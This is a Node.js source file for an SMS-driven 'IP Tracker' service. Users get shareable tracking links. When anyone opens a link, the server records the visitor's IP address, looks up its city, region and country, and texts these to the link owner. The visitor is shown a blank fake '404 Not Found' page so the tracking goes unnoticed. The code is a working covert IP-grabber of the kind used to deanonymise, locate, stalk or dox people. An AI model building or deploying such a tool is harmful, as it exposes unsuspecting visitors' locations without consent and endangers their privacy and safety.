const http = require('http');
const https = require('https');
const nodemailer = require('nodemailer');
const crypto = require('crypto');
const { URL } = require('url');

const transporter = nodemailer.createTransporter({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

const carrierGateways = {
  '1': 'vtext.com',        // Verizon
  '2': 'txt.att.net',      // AT&T
  '3': 'tmomail.net',      // T-Mobile
  '4': 'messaging.sprintpcs.com', // Sprint
  '5': 'mymetropcs.com'    // Metro PCS
};

const users = new Map();

async function getLocation(ip) {
  if (ip === '::1' || ip === '127.0.0.1' || ip === 'Unknown') {
    return { country: 'Local', region: 'Local', city: 'Local' };
  }
  
  return new Promise((resolve) => {
    https.get(`https://ipapi.co/${ip}/json/`, (response) => {
      let data = '';
      response.on('data', (chunk) => data += chunk);
      response.on('end', () => {
        try {
          const location = JSON.parse(data);
          resolve({
            country: location.country_name || 'Unknown',
            region: location.region || 'Unknown',
            city: location.city || 'Unknown'
          });
        } catch (error) {
          resolve({ country: 'Unknown', region: 'Unknown', city: 'Unknown' });
        }
      });
    }).on('error', () => {
      resolve({ country: 'Unknown', region: 'Unknown', city: 'Unknown' });
    });
  });
}

function generateUserId() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendSMS(phoneNumber, message, carrier) {
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    console.log('Email credentials not configured, skipping SMS');
    return;
  }

  if (!carrier || !carrierGateways[carrier]) {
    console.log('Invalid carrier, skipping SMS');
    return;
  }

  try {
    const cleanPhone = phoneNumber.replace(/\D/g, '');
    const smsEmail = `${cleanPhone}@${carrierGateways[carrier]}`;
    
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: smsEmail,
      subject: '',
      text: message
    });
    
    console.log(`SMS sent to ${phoneNumber} via ${carrierGateways[carrier]}`);
  } catch (error) {
    console.error('Failed to send SMS:', error.message);
  }
}

function registerUser(phoneNumber, carrier) {
  const userId = generateUserId();
  users.set(userId, { phone: phoneNumber, carrier: carrier, createdAt: new Date() });
  return userId;
}

function setUserCarrier(phoneNumber, carrier) {
  for (const [userId, user] of users.entries()) {
    if (user.phone === phoneNumber) {
      user.carrier = carrier;
      return userId;
    }
  }
  return null;
}

function getUserByTrackingId(trackingId) {
  return users.get(trackingId);
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const path = url.pathname;

  // Test endpoint to simulate SMS signup
  if (path === '/test' && req.method === 'GET') {
    const phoneNumber = '+15551234567'; // Test phone number
    registerUser(phoneNumber, null);
    
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <h2>SMS Signup Test</h2>
      <p>Simulating user texting: <strong>${phoneNumber}</strong></p>
      <p>Response: Welcome message sent (check console)</p>
      <p>Now test carrier selection: <a href="/test-carrier">Click here</a></p>
    `);
    
    await sendSMS(phoneNumber, `📱 Welcome to IP Tracker!\n\nSelect your carrier:\n1 = Verizon\n2 = AT&T\n3 = T-Mobile\n4 = Sprint\n5 = Metro PCS\n\nReply with just the number (1-5)`, '1');
    return;
  }

  // Test carrier selection
  if (path === '/test-carrier' && req.method === 'GET') {
    const phoneNumber = '+15551234567';
    const userId = setUserCarrier(phoneNumber, '1'); // Verizon
    if (userId) {
      const trackingUrl = `https://${req.headers.host}/${userId}`;
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(`
        <h2>Carrier Selected (Verizon)</h2>
        <p>Your tracking link: <a href="/${userId}">${trackingUrl}</a></p>
        <p>Click the link above to test IP tracking!</p>
      `);
      await sendSMS(phoneNumber, `✅ You're signed up for IP tracking!\n\nYour tracking link: ${trackingUrl}\n\nShare this link to track visitor IPs. You'll get SMS alerts when someone visits it.`, '1');
    }
    return;
  }

  // Handle SMS webhook
  if (path === '/sms' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const data = new URLSearchParams(body);
        const fromPhone = data.get('From');
        const messageBody = data.get('Body');

        if (fromPhone && messageBody) {
          const message = messageBody.trim();
          
          // Check if it's a carrier selection (1-5)
          if (/^[1-5]$/.test(message)) {
            const userId = setUserCarrier(fromPhone, message);
            if (userId) {
              const trackingUrl = `https://${req.headers.host}/${userId}`;
              await sendSMS(fromPhone, `✅ You're signed up for IP tracking!\n\nYour tracking link: ${trackingUrl}\n\nShare this link to track visitor IPs. You'll get SMS alerts when someone visits it.`, message);
            } else {
              await sendSMS(fromPhone, `❌ Error setting up your account. Please text "start" to begin again.`, '1');
            }
          } else {
            // Initial signup - ask for carrier
            registerUser(fromPhone, null);
            await sendSMS(fromPhone, `📱 Welcome to IP Tracker!\n\nSelect your carrier:\n1 = Verizon\n2 = AT&T\n3 = T-Mobile\n4 = Sprint\n5 = Metro PCS\n\nReply with just the number (1-5)`, '1');
          }
        }

        res.writeHead(200, { 'Content-Type': 'text/xml' });
        res.end('<?xml version="1.0" encoding="UTF-8"?><Response></Response>');
      } catch (error) {
        console.error('SMS webhook error:', error);
        res.writeHead(500);
        res.end('Error');
      }
    });
    return;
  }

  // Handle tracking links (both /t/id and /id formats)
  let trackingId = null;
  if (path.startsWith('/t/')) {
    trackingId = path.split('/')[2];
  } else if (path.length > 1 && !path.includes('.')) {
    trackingId = path.substring(1);
  }

  if (trackingId) {
    const user = getUserByTrackingId(trackingId);

    if (user) {
      let clientIP = req.connection.remoteAddress || 
                     req.socket.remoteAddress ||
                     req.headers['x-forwarded-for'] ||
                     req.headers['x-real-ip'] ||
                     req.headers['x-client-ip'] ||
                     'Unknown';

      if (clientIP.includes(',')) {
        clientIP = clientIP.split(',')[0].trim();
      }

      if (clientIP.startsWith('::ffff:')) {
        clientIP = clientIP.substring(7);
      }

      const location = await getLocation(clientIP);
      console.log(`IP tracked for user ${user.phone}: ${clientIP} | ${location.city}, ${location.region}, ${location.country}`);

      const alertMessage = `🚨 IP Tracker Alert!\nIP: ${clientIP}\nLocation: ${location.city}, ${location.region}, ${location.country}\nTime: ${new Date().toLocaleString()}\nLink: /${trackingId}`;
      
      await sendSMS(user.phone, alertMessage, user.carrier);
    }

    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body></body></html>');
    return;
  }

  // Default 404 response
  res.writeHead(404, { 'Content-Type': 'text/html' });
  res.end('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body></body></html>');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`IP tracking server running on port ${PORT}`);
});